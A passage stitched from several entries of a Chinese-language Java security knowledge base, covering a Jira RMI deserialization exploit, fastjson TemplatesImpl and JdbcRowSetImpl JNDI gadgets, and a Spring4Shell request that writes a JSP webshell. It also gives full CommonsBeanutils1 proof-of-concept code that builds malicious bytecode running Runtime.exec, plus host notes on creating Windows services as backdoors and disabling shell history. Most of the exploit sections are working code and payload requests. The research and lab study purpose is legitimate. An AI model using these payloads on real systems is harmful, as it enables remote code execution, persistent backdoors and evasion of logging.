BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; Serializable payload = (Serializable) queue; RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(payload); } } 参考链接 https://forum.butian.net/share/653 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:08:50 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/16.fastJson反序列化原理及利用.html":{"url":"知识库/02.JAVA安全/16.fastJson反序列化原理及利用.html","title":"16.fastJson反序列化原理及利用","keywords":"","body":" 引入fastJson 1.2.24 调试 结论 测试 通过getter触发gadget getter gadget链路 通过setter方法触发gadget Setter gadget 链路 引入fastJson 1.2.24 环境：jdk8u181 为了方便切换fastjson的各个版本，我创建一个maven项目，在pom.xml引入FastJson junit junit 4.11 test com.alibaba fastjson 1.2.24 然后写一个简单的javaBean package com.aaron.test; public class User { private String name; private String age; public String getName() { System.out.println(\"getName is running!\"); return name; } public void setName(String name) { System.out.println(\"SetName is running!\"); this.name = name; } public String getAge() { return age; } public void setAge(String age) { this.age = age; } @Override public String toString(){ return \"User{\" + \"name='\" + name + '\\'' + ',' + \"age='\" + age + '\\'' + '}'; } } 在以上基础上，构建一个Main类，使用fastjson来解析 package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\", \\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行main方法 fastjson 会解析该字符串，将其解析成object，就可以看到解析完成之后的User{name='aaron', age='23'}，在这个过程中，SetName 方法是被调用了 上面代码中输出的是一个Object类型的对象，但是从输出结果中看到该Object对象已经被解析为了User类型的对象。这就是json数据中的@type属性起的作用， Fastjson支持在json数据中使用@type属性指定该json数据被反序列为什么类型的对象。 同时控制台也输出了 SetName is running! ， 说明在反序列化对象时，会执行javabean的setter方法为其属性赋值。 调试 调试fastjson可让我花了不少力气，虽然我们都知道触发漏洞是在getter/setter处，fastjson会直接反射需要反序列化的类，并调用setter方法进行赋值，但是这个调试真是太麻烦了！ 那么就开始调试！我丢！ 强制进入parse函数 首先进入之后就会调用parse()函数，继续进入parse()函数 依次步进，在这里又调用了parser对象的parse方法，继续进入 继续进入parse函数 单步运行，直到case 12，这里调用了parseObject函数，继续进入 进入parseObject函数，继续单步 在这里调用了deserializer实例方法的deserializer函数，看这个函数有点像，而且还传入了this(分析上下文应该是传入待解析的json)，clazz，还有filedname，这里其实clazz已经从@type处已经找到字节码了 进入deserializer方法，在这里有个巨坑，强制进入都一直进不去，我只有手动进入，艹！ 第一次手动进入，就到下面这个函数，这个函数继续手动进入deserializer函数 到这个函数，打上断点才可以继续调试 继续单步，不知道走了多少步。。。到了这里，刚刚就是在拆解json字符串，把key和Object构造好 然后进入parseField函数 单步运行到执行parseField方法处，艹，他妈的！再进入 继续单步，经过一系列的if...else...终于看到点希望，我擦，直到看到了setValue函数，艹 我们进入setValue函数，可以看到这里将value，fieldInfo都传进来了 然后通过反射,去取相对应的setter方法 Method method = this.fieldInfo.method 如果存在setter方法 则直接调用该方法赋值 然后就到我们的setter方法这儿，就会打印SetName is running! 调这几把玩意人给调傻了，在deserializer方法，一直无法进入，手工进入找到调用的方法后才进行下一步 结论 调试完毕之后，就可以得到结论 fileldinfo中包含JavaBean的属性名称（private）及其setter，getter等method方法，然后通过反射调用setter方法进行赋值 当JavaBean存在属性为AtomicInteger、AtomicLong、AtomicBoolean、Map或Collection类型，且fieldinfo.getOnly值为true时（当javabean的属性没有setter方法，只有getter方法时，该值为true），在反序列化时会调用该属性的getter方法测试 在setValue函数中，我们可以看到，this.fieldInfo满足私有属性（private)且getOnly的时候，意思是只存在getter方法，不存在setter方法的时候，且类型为AtomicInteger，AtomicLong，AtomicBoolean，Map，Collection的时候，会直接调用getter方法，这里我用AtomicInteger示例 // javaBean public class User { private String name; private String age; private AtomicInteger test; public AtomicInteger getTest() { try{ Runtime.getRuntime().exec(\"gnome-calculator\"); }catch (Exception e){ e.printStackTrace(); } return test; } } // Main package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\",\\\"test\\\":12,\\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行结果如下图所示，我在此处执行了getter方法，而我的getter方法里却实现了弹出计算器的命令执行代码，当invoke之后，调用getter方法，执行命令 通过getter触发gadget 测试类选择TemplatesImpl，首先探测可用于触发getter gadgets，如下图所示，可以看到_auxClasses，_outputProperties属性是map类，首先满足第一条件，继续寻找是否只有getter方法 在这里可以看到满足条件的两个属性_auxClasses，_outputProperties，只有_outputProperties属性是存在getter方法 我最初是在网上找了一个复现poc public class TemplatesImplTest { public static void main(String[] args) throws Exception { String className = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; // 获取Exec的字节码 String byteCode = FileTools.getEvil(Class.forName(\"com.fastjson.tools.Exec\")); String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"'_tfactory':{},\" + \"\\\"_outputProperties\\\":{},\" + \"\\\"_name\\\":\\\"\\\",\" + \"\\\"_version\\\":\\\"\\\",\" + \"\\\"allowedProtocols\\\":\\\"\\\"}\"; System.out.println(json); // 设置反序列化时对类的私有属性进行赋值 JSON.parse(json, Feature.SupportNonPublicField); } } 当时我也没有想通，为什么要有这些参数，通过反射看了构造函数，以及找了很多很多文章学习，也没有发现什么共同点，直到最后靠自己调试！卧槽，真他妈疯了，又搞了一下午，不过总得来说，自己总结学习到的东西还是很有帮助的。 首先我们知道，fastjson会根据json字符串遍历key，然后再调用getter/setter赋值操作 然后，我们利用的方式是getOnly，只有getter方法，没有setter方法 最后，在invoke之后，TemplatesImpl具体又执行了什么呢？ 我在这里做一个测试，在invoke之后强制进入找找问题所在，我把json数据改成如下所示，将_tfactory，_outputProperties换一个位置 String json = \"{\\\"@type\\\":\\\"\" + className + \"\\\",\" + \"\\\"_bytecodes\\\":[\\\"\" + byteCode + \"\\\"],\" + \"'_name':'',\" + \"\\\"_outputProperties\\\":{},\"+ \"'_tfactory':{}}\"; 然后再进行调试，我们着重看outputProperties触发处，在invoke处进入 然后我们可以看到，这里要进行了newTransformer()，在这里请注意我们要反序列化的字符串的顺序，此时_bytecodes，_name，已经完成赋值，但是，_tfactor，_outputProperties还未赋值，此时我们进入newTransforemer()方法 在这里我们要实例化的transformer，需要传入参数，但是_tfactor是null 我们进入getTransletInstance()函数，this中，_class[_transletIndex] 是初始化的数组，因为_transletIndex = -1了，还有待传入的_tfactor为null，可以看到_class=null，要执行defineTransletClasses()方法，进入该方法 当我继续向下执行的时候，就直接捕获异常了 那么我将_tfactor 和 _outputProperties更换位置呢？先让_tfactor取到值，再进行下一步实例化呢？ 这里就直接进入try代码块了 执行完defineTransletClasses()，之后，得到了_class[_transletIndex] 为我们写入的恶意字节码 然后再对_class[_transletIndex]进行实例化(newInstance()) 即可加载恶意构造函数 getter gadget链路 当反序列化com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类时，由于_outputProperties 属性是Map属性，且该属性只有getter方法，没有setter方法，因此会有如下的调用链 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() => new Transformer() => getTranslateInstance() => defineTransletClasses()，到了这里，会读取_bytecodes[]属性中的字节码，然后在判断是否是继承于AbstractTranslet类 最后调用newInstance()方法实例化该类的对象，该方法是调用该类的缺省构造函数实例化对象 虽然上面的测试代码给_byteCodes 属性传入的字节码是经过base64编码的，但是在defineTransletClasses()方法中加载字节码之前，在com.alibaba.fastjson.parser.JSONScanner.bytesValue()方法中，已经将其解码了 通过setter方法触发gadget 我们使用JdbcRowSetImpl 类，这里用的就是JDNI注入，具体可以看JNDI注入之com.sun.rowset.JdbcRowSetImpl 利用链 这里我简单写一下客户端的代码 package com.aaron.test; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; public class TemplatesImplTest { public static void main(String[] args)throws Exception { String className = \"com.sun.rowset.JdbcRowSetImpl\"; String ldapPath = \"ldap://127.0.0.1:1389/aa\"; String json = \"{\\\"@type\\\":\\\"\"+className+\"\\\" ,\"+ \"\\\"dataSourceName\\\":\\\"\"+ldapPath+\"\\\",\"+ \"\\\"autoCommit\\\":true\"+ \"}\"; System.out.println(json); JSON.parse(json, Feature.SupportNonPublicField); } } Setter gadget 链路 链路很简单了 在对com.sun.rowset.JdbcRowSetImpl类反序列化时，会先执行dataSourceName属性的setter方法，给dataSourceName属性赋值为ldap://127.0.0.1:1099/XX，然后执行autoCommit属性的setter方法，有如下调用链： setAutoCommit() --> connect() --> ctx.lookup(getDataSourceName())，这里就造成了JNDI注入 通过marshalsec工具启动一个ldap服务，再启一个web服务专门放字节码，然后客户端就可以下载恶意字节码，完成JNDI注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:16:40 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/16.fastJson反序列化原理及利用.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/17.Spring-Core_RCE.html":{"url":"知识库/02.JAVA安全/17.Spring-Core_RCE.html","title":"17.Spring-Core_RCE","keywords":"","body":" 环境搭建 启动环境 漏洞复现 问题总结 漏洞分析 环境搭建 docker pull vulfocus/spring-core-rce-2022-03-29 启动环境 docker run -it -d --name springrce -p 192.168.93.131:9000:8080 vulfocus/spring-core-rce-2022-03-29 访问192.168.93.131:9000 出现如下界面则说明环境搭建成功 漏洞复现 当前docker 环境中，jdk版本为9.0 POST / HTTP/1.1 Host: 192.168.93.131:9000 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 685 suffix: %> prefix: \")%3b+while((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}+out.print(\"\")%3b%25%7bsuffix%7di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat 问题总结 目前看效果只能写一次，发送过1次payload之后，是不能向其他目录下写新文件 发送一次payload之后之后，只能向文件里追加，不会覆盖文件 如果没有容器化部署（tomcat war包部署），是写不了webshell，虽然还没捋清楚是否是代码执行，如果是代码执行，那么可以在运行态中写入内存马达到作用，如果是命令执行，那么是不行的（看payload的样子感觉是命令执行pipeline） 如果是以jar包部署，那么考虑到启动jar包的用户权限，一般不会太高，在做了最小权限法的服务器，启动web服务的用户是没有家目录，导致无法写入公钥，也没权限写入计划任务 post包最后也就是第15行后不要有回车，不然生成的文件是shell$\\r\\n.jsp 目前看很鸡肋漏洞分析 空了写 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:17:34 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/17.Spring-Core_RCE.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html":{"url":"知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html","title":"18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链","keywords":"","body":"com.sun.rowset.JdbcRowSetImpl 目前要进行jndi注入，需要满足两个条件，在受害者要存在以下代码，且uri可控 String uri = \"xxx\"; Context ctx = new InitialContext(); ctx.lookup(uri); com.sun.rowset.jdbcRowSetImpl，是fastjson反序列化漏洞触发jndi注入的一环 查看jdbcRowSetImpl，我们客户端这样写 JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用 JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1:1099/aa\"); JdbcRowSetImpl_inc.setAutoCommit(true); 运行起来报错是jndi unable connect，web服务也没有收到请求，客户端更不会执行恶意的字节码， 打断点调试，从而也进一步分析 jdk 版本8u181 我们在setAutoCommit(true)处打断点，强制进入可以看见如下代码 // JdbcRowSetImpl.java public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { //不进入 this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); // 进入此处,进行连接 this.conn.setAutoCommit(var1); // 设置autoCommit为true } } 在这里我们会进行下一步连接，我们继续看，325，326 行不就是标准的jndi注入吗？ 存在new InitialContext()，且lookup(this.getDataSourceName)，DataSourceName在初始的时候是setDataSourceName的，该值我们也是可控的 // JdbcRowSetImpl.java connect() 关键代码 private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); //强制进入lookup，查看无法执行的原因 return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 又回到最开始调试JNDI注入的lookup处，我们继续跟进，进入lookup 再次进入lookup 进入decodeObject 走到这里发现居然抛出了错误，但是却看不见，这个错误也就是jdk8u181 的codebase错误，需要设置 trustURLCodebase为true 可以看到没有调用NamingManager.getObjectInstance函数，直接异常捕获了 最后在这里直接close掉，所以并没有去获取到恶意字节码，就直接关闭连接了 为了避免这个尴尬局面，我在客户端设置属性 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");再来尝试一下， 发现设置codebase为true之后，就可以下载恶意字节码，并实例化执行constructor函数，弹出计算器 在实际渗透中，一般使用marshalsec启动rmi或者ldap 下载marshalsec,查看marshalsec.jndi.RMIRefServer 文件，启动参数即是 codebase_url#classname port 默认端口是1099 使用工具效果如下 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:18:20 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/20.CommonsBeanutils1分析.html":{"url":"知识库/02.JAVA安全/20.CommonsBeanutils1分析.html","title":"20.CommonsBeanutils1分析","keywords":"","body":" 简介 环境 Tips POC POC_1 简介 Apache Commons Beanutils是 Apache Commons工具集中的另一个项目，它提供对 javaBean 的一些操作，javaBean的用于映射数据库的。 环境 CB1 类似于CC2，利用优先级队列触发comparator的compare方法，其中需要以下依赖 commons-collections commons-collections 3.1 commons-beanutils commons-beanutils 1.9.2 commons-logging commons-logging 1.2 Tips CB1 类似于CC2，在Commons Beanutils中提供对JavaBean的一些操作，在commons.beanutils的BeanComparator类中，实现了Comparator和Serializable接口，如下为BeanComparator#compare方法，当this.property为空的时候，则比较o1,o2两个元素，否则则调用PropertyUtils.getProperty(),当o1为对象A，this.property为name,则此时PropertyUtils.getProperty方法会调用A.getName方法 public int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\"IllegalAccessException: \" + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\"InvocationTargetException: \" + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\"NoSuchMethodException: \" + var7.toString()); } } } 在TemplatesImpl中，可以看到在getOutputProperties()方法中，调用了newTransformer()方法， public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 在newTransformer()方法中，调用getTransletInstance()方法，只要_name不为null，_class为null，_bytecode为我们的恶意字节码，那么攻击就能成功 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 那么总结一下，就是如下几点： BeanComparator@property = outputProperties TemplatesImpl@_name != null TemplatesImpl@_bytecodes = 恶意字节码 queue.length >= 2 queue 需要第一次赋值用于序列化，第二次赋值则是反射将对应的恶意字节码放入对应的队列中 comparator 可以先不用放在构造函数中，最后再反射加入queue实例的成员变量中POC ```java package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; public class TestCB1 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f = comparator.getClass().getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); objectOutputStream.close(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } ![image.png](Commons Beanutils1 分析.assets/2023_05_19_10_37_02_lHAmzPr0.png) ![image.png](Commons Beanutils1 分析.assets/2023_05_19_10_37_03_tiRGTYOD.png) ## POC_1 将compartor在最后反射写入其中，正常赋值，只是在最后要进行序列化的时候通过反射将其更改 看起来比较多余，相当于对代码进行了review，更明白了反序列化的目的以及反射的高级 ```java package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCB1_1 { public static void main(String[] args)throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f1 = queue.getClass().getDeclaredField(\"comparator\"); f1.setAccessible(true); f1.set(queue,comparator); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cb1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:08:08 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/20.CommonsBeanutils1分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html":{"url":"知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html","title":"01.主机乱七八糟的问题汇总（持续更新）","keywords":"","body":" CentOS 7 编译安装nginx，如何将其加入到服务（nginx.service）？ Linux 写入/usr/lib/systemd/system/xxx.service 不生效解决办法 nginx 如何配置Basic认证？ docker Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 背景 解决办法 Docker启动镜像 启动镜像 Docker清除缓存 umount devices is busy？ linux history添加执行的时间 bash shell 登录shell，执行命令使其不保存至history？ 如何查看文件md5，sha1，sha256等（主要是windows） Linux windows windows 新建删除服务 删除服务 新建服务 Linux 安装pip2,pip3 Linux 更新pip2 pip3 Linux 启动IDEA 报错 Error opening zip file or JAR manifest missing : /home/luogan/.jetbrains/jetbrains-agent-v3.2.0.de72.619 Error occurred during initialization of VM 背景 Linux 配置开机自动挂载硬盘 背景 自动挂载 rpm 包与 deb包相互转换 Linux 执行命令时错误返回在shell时，如何将其去掉？ windows 和 Linux shell的转义符 windows、Linux 在终端中如何设置临时代理 windows Linux Linux 更新系统字体 JDK1.7 在macos版本的idea 运行警告 解决方式 MacOS docker 换源 Kali 2019.4 换源之后，apt update 报错 CentOS 7 编译安装nginx，如何将其加入到服务（nginx.service）？ # 默认编译安装到/usr/local/nginx # 在 /usr/lib/systemd/system/目录下创建服务 cd /usr/lib/systemd/system/ touch nginx.service vim nginx.service # 添加如下内容 [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=/usr/local/nginx/logs/nginx.pid ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target Linux 写入/usr/lib/systemd/system/xxx.service 不生效解决办法 systemctl daemon-reload nginx 如何配置Basic认证？ 配置nginx，新增server节点 针对es 配置 nginx basic 认证 server { listen 9201; server_name elasticSearch; location / { proxy_pass http://127.0.0.1:9200/; auth_basic \"nginx basic http for es\"; auth_basic_user_file conf.d/passwd; autoindex on; } } 再使用 openssl 或者htpasswd 生成密码文件(推荐使用openssl，系统自带，htpasswd可自行查询)，格式如下： 此处conf.d/passwd 是在/usr/local/nginx/conf/conf.d/passwd # openssl（默认自带） printf \"your_username:$(openssl passwd -crypt your_password)\\n\" >> conf.d/passwd 生成密码之后，使用如下命令检查配置文件是否正确 nginx -t 重启nginx docker Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 背景 由于尝试做docker api 未授权rce 漏洞，将docker.service 中的ExecStart 修改成了对外开放2375端口，最后测试完毕之后，将注释去掉之后，systemctl daemon-reload 之后启动成功之后，报错如下: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 且查看 systemctl status docker ，发现目标为active:running，且无/var/run/docker.sock文件 解决办法 将fd:// 更改为 unix://，然后重新加载systemctl daemon-reload，systemctl restart docker Docker启动镜像 在docker 中 要找一个新的镜像，我们首先要查看需要下载的镜像,这里以mysql举例 docker search mysql docker pull mysql 拉取完成之后，查看所有的镜像 docker images -a 启动镜像 docker run -p 本机映射端口:镜像映射端口 -d --name 启动镜像名称 -e 镜像启动参数 镜像名称:版本 # -p 本机端口和容器端口映射 # -d 后台运行 # --name 容器名称 # -e 镜像启动参数 例：https://hub.docker.com/_/mysql docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag 查看相关参数从hub.docker.com 中寻找，或者网传使用runlike docker run -p 3306:3306 -d --name mysql-aaron -e MYSQL_ROOT_PASSWORD=admin mysql:latest 运行完之后就可以看到容器已经启动 Docker清除缓存 docker system prune --volumes umount devices is busy？ NFS未授权挂载经常会出现此类问题 原因：因为有多个进程在使用，所以无法取消挂载，当将所有的进程kill掉之后，再umount即可 使用fuser命令罗列出pid fuser -v -m -v 表示 verbose 模式。进程以 ps 的方式显示，包括 PID、USER、COMMAND、ACCESS 字段 -m 表示指定文件所在的文件系统或者块设备（处于 mount 状态）。所有访问该文件系统的进程都被列出。 linux history添加执行的时间 bash shell 编辑/etc/profile 在最下方添加 HISTTIMEFORMAT=\"%Y-%m-%d %H:%M:%S\" 保存后退出，执行 source /etc/profile 效果如下 zsh 不需要配置，只需要执行 # 标准日期 history -i # 英文日期 history -E 登录shell，执行命令使其不保存至history？ set +o history 如何查看文件md5，sha1，sha256等（主要是windows） Linux 在linux中，查看文件md5，sha1，sha256等等都很简单，只需要键入命令 md5sum output b5cd11c42c9031cad6515ff62f4e03ac output sha1sum output 6c2c76a15c272db2b582e8f7d47c1f64b9b2f32c output sha256sum output a4ed89f176e5200ebe571631bd2fdb0d6e18a9ce7b5d78eb69b4a3abd538898b output windows certutil -hashfile MD5 certutil -hashfile SHA1 certutil -hashfile SHA256 windows 新建删除服务 常常用作后门 删除服务 sc delete 服务名称 新建服务 sc create monitor binpath= \"可执行文件exe绝对路径 --service -r 可执行文件根路径\" displayname= \"监控文件夹\" start= auto # sc create monitor binpath= \"D:\\Software\\OtherTool\\MonitorFolder.exe --service -r D:\\Software\\OtherTool\" displayname= \"监控文件夹\" start= auto Linux 安装pip2,pip3 // pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py // pip3 wget https://bootstrap.pypa.io/get-pip.py # 如果这里报错 ModuleNotFoundError: No module named 'distutils.util' # 执行如命令 apt install -f apt-get install python3-distutils python3 get-pip.py Linux 更新pip2 pip3 python2 -m pip install --upgrade pip python3 -m pip install --upgrade pip Linux 启动IDEA 报错 Error opening zip file or JAR manifest missing : /home/luogan/.jetbrains/jetbrains-agent-v3.2.0.de72.619 Error occurred during initialization of VM 背景 重装了idea，之前使用激活工具激活 find / -name \"*vmoptions*\" 删除/home/${User}/.IntelliJIdea2019.3/即可 Linux 配置开机自动挂载硬盘 背景 由于公司新发的thinkpad是SSD + HD ，我将操作系统装在了固态硬盘上，但是固态硬盘只有128G，HD却有500G，所以我只有格式化硬盘，将其挂载到我的硬盘上，具体如下所示 首先我们知道Linux是文件系统，硬盘也不例外，硬盘的标识是在/dev/sda0-6 sudo fdisk -l 可以看到我这里的硬盘是/dev/sda1，那么我将其挂载上的命令如下 sudo mount /dev/sda1 /my_HD mount | grep my_HD df -h 